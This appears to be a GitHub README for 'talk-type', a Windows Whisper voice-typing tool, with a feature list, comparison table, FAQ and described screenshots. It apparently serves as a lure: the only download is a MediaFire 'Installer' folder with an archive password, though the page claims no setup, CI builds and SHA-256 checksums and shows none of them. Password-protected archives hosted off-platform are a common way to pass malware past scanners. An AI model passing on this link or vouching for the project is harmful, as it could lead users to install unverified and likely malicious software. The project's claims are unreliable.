# talk-type

⌨️ Free, open-source voice typing for Windows — local Whisper dictation into any app via push-to-talk. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Push-to-talk hotkey** — hold the key, speak, release; text appears in whatever app has focus
- ✅ **Local Whisper models** — tiny through medium offered with speed and accuracy notes per size
- ✅ **Punctuation cleanup** — filler words trimmed and sentences capitalized before the text lands
- ✅ **Language auto-detect** — dictate in two or three languages and it follows the switch
- ✅ **Snippet commands** — spoken phrases like new paragraph become the real thing
- ✅ **Dictation history** — last fifty transcripts stored locally for copy or re-insert
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why talk-type

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **talk-type** | Windows Voice Typing | Dragon | Whisper scripts |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free built-in | Paid | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Whisper accuracy class | **Yes** | No | No | Yes
| Works fully offline | **Yes** | Yes | Yes | Yes
| Punctuation cleanup | **Yes** | Partial | Yes | Scripted
| Portable, no install | **Yes, 100 MB** | Built-in | Installer | Python env

## FAQ

**best free voice typing on Windows with Whisper accuracy offline?**

Built-in voice typing is convenient but mishears names, and commercial dictation wants a subscription per seat. talk-type runs Whisper locally, cleans punctuation and types straight into the focused app from a push-to-talk key. It is a 100 MB portable exe, MIT, offline, and transcripts never leave the machine.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark overlay mid-dictation (#121417, green #4ADE80): floating mic level bar, live partial text reading, target app visible behind, model chip reading small.en loaded.
2. History panel by the tray: fifty transcripts with time and word counts, copy and insert buttons per row, search field at the top.
3. Settings: hotkey recorder showing Right Ctrl held, snippet table with new paragraph and my email rows, model picker with four sizes and speed badges.

## Download

| Source | Link |
|---|---|
| 💾 **Installer talk-type** | [Installer talk-type](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).